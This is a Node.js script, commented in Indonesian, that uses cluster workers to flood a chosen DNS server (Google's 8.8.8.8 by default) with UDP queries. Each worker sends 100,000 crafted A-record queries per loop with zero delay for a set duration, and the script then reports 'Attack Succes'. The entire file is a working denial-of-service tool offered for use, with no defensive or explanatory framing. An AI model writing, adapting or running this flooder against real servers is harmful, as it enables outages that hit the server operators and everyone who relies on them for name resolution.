const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const targetDNS = process.argv[2] || '8.8.8.8'; // Default ke Google DNS
const queryDomain = process.argv[3] || 'example.com'; // Default domain untuk diuji
const duration = parseInt(process.argv[4]) || 10; // Durasi dalam detik
const threads = parseInt(process.argv[5]) || os.cpus().length * 2; // Default 2x jumlah core CPU
const queriesPerLoop = parseInt(process.argv[6]) || 100000; // Default 100.000 query per loop

if (cluster.isMaster) {
    console.log(`Mengirim Request ke ${targetDNS} untuk ${queryDomain} selama ${duration} detik dengan ${threads} proses (${queriesPerLoop} query per loop).`);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('Attack Succes');
        process.exit(0);
    }, duration * 1000);
} else {
    const socket = dgram.createSocket('udp4');

    const buildDNSQuery = (domain) => {
        const buffer = Buffer.alloc(512);
        buffer.writeUInt16BE(0x1234, 0); // ID Query
        buffer.writeUInt16BE(0x0100, 2); // Flags: Recursion Desired
        buffer.writeUInt16BE(1, 4); // QDCOUNT (1 pertanyaan)
        buffer.writeUInt16BE(0, 6); // ANCOUNT
        buffer.writeUInt16BE(0, 8); // NSCOUNT
        buffer.writeUInt16BE(0, 10); // ARCOUNT

        let offset = 12;
        domain.split('.').forEach(part => {
            buffer.writeUInt8(part.length, offset++);
            buffer.write(part, offset);
            offset += part.length;
        });

        buffer.writeUInt8(0, offset++); // Akhir dari nama domain
        buffer.writeUInt16BE(0x0001, offset); // QTYPE (A record)
        buffer.writeUInt16BE(0x0001, offset + 2); // QCLASS (IN)
        
        return buffer.slice(0, offset + 4);
    };

    const dnsQuery = buildDNSQuery(queryDomain);

    const sendQueries = () => {
        for (let i = 0; i < queriesPerLoop; i++) {
            socket.send(dnsQuery, 0, dnsQuery.length, 53, targetDNS);
        }
    };

    const interval = setInterval(sendQueries, 0); // Zero delay untuk throughput tertinggi

    setTimeout(() => {
        clearInterval(interval);
        socket.close();
        process.exit(0);
    }, duration * 1000);
}